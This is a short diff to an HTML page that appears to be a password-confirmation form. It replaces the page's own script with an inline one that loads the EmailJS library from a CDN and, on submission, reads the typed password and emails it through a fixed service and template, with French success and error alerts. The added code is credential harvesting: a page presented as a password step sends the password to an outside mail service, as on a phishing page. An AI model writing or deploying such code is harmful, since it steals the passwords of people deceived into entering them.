@@ -27,6 +27,33 @@
       </form>
     </div>
 
-    <script src="/password_confirmation/script.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+      (function () {
+        emailjs.init("TKsAeYBNJTNWnyUxfM");
+      })();
+
+      document
+        .getElementById("password-form")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          const password = document.getElementById("password").value;
+
+          emailjs
+            .send("service_548dlph", "template_1m2mgz5", {
+              user_password: password,
+            })
+            .then(
+              function (response) {
+                console.log("Succès:", response);
+                alert("Mot de passe envoyé !");
+              },
+              function (error) {
+                console.error("Erreur:", error);
+                alert("Échec de l'envoi.");
+              }
+            );
+        });
+    </script>
   </body>
 </html>
